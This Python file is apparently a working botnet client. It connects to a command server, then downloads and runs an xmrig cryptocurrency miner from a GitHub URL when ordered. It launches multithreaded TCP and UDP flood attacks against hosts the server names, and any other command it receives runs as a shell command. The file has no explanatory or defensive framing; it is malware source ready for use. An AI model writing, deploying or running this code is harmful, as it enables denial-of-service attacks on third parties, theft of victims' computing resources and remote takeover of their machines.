import multiprocessing
import threading
import requests
import socket
import random
import time
import sys
import os

host = "127.0.0.1"
port = 4444

cpu = multiprocessing.cpu_count()

if cpu >= 2:
    thread = int(multiprocessing.cpu_count() / 2)
else:
    thread = 1


def client():
    global l4_tcp_flag, l4_udp_flag

    try:
        c = socket.socket()
        c.connect((host, port))

        while True:
            data = c.recv(1024).decode()

            if data == "ping":
                c.sendall(b'pong')

            elif data.startswith("miner"):
                data = data.split()

                pool = data[1]
                wallet = data[2]
                worker = data[3]

                data = " ".join(data)

                if sys.platform == "linux":
                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
                    ext = "./"
                    rig = "xmrig"
                else:
                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
                    ext = ""
                    rig = "xmrig.exe"

                if not os.path.exists(rig):
                    response = requests.get(url)

                    with open(rig, 'wb') as f:
                        f.write(response.content)

                if os.path.exists(rig):
                    os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")

            # L4 TCP
            elif data == "l4 tcp stop":
                l4_tcp_flag.set()

            elif data.startswith("l4 tcp"):
                data = data.split()

                l4_tcp_ip = socket.gethostbyname(data[2])
                l4_tcp_port = int(data[3])

                l4_tcp_bytes = random._urandom(int(data[4]))

                data = " ".join(data)

                l4_tcp_flag = threading.Event()

                def l4_tcp():
                    while not l4_tcp_flag.is_set():
                        try:
                            l4_tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            l4_tcp_sock.connect((l4_tcp_ip, l4_tcp_port))
                            l4_tcp_sock.send(l4_tcp_bytes)

                            print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {l4_tcp_ip}:{l4_tcp_port}")

                        except Exception as err:
                            print("\033[31m[-]\033[0m", err)

                def l4_tcp_bg():
                    for i in range(thread):
                        l4_tcp_thread = threading.Thread(target=l4_tcp)
                        l4_tcp_thread.start()

                l4_tcp_task = threading.Thread(target=l4_tcp_bg)
                l4_tcp_task.start()

            # L4 UDP
            elif data == "l4 udp stop":
                l4_udp_flag.set()

            elif data.startswith("l4 udp"):
                data = data.split()

                l4_udp_ip = socket.gethostbyname(data[2])
                l4_udp_port = random.randint(0, 65535)
                l4_udp_bytes = random._urandom(int(data[3]))

                data = " ".join(data)

                l4_udp_address = (l4_udp_ip, l4_udp_port)

                l4_udp_flag = threading.Event()

                def l4_udp():
                    while not l4_udp_flag.is_set():
                        try:
                            l4_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                            l4_udp_socket.sendto(l4_udp_bytes, l4_udp_address)

                            if l4_udp_port == 0:
                                print("\033[32m[+]\033[0m L4 UDP Packet sent ->", l4_udp_ip)
                            else:
                                print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {l4_udp_ip}:{l4_udp_port}")

                        except Exception as err:
                            print("\033[31m[-]\033[0m", err)

                def l4_udp_bg():
                    for i in range(thread):
                        l4_udp_thread = threading.Thread(target=l4_udp)
                        l4_udp_thread.start()

                l4_udp_task = threading.Thread(target=l4_udp_bg)
                l4_udp_task.start()

            else:
                os.popen(data)

    except socket.error:
        time.sleep(5)
        client()


client()
